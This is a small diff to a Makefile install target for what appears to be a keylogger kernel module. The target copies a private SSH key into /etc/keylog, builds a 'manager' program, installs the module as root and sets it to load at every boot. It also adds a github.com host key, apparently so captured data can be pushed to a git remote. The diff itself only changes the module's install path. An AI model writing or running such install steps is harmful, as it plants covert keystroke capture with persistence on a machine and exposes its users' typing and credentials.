@@ -35,7 +35,7 @@ install:
 	cp ../git_id_rsa /etc/keylog
 	gcc manager.c -o /etc/keylog/manager.o
 	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
-	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
+	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)
 	echo $(modname) > /etc/modules-load.d/$(modname).conf
 	insmod $(modname).ko
 	echo "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl">> ~/.ssh/known_hosts
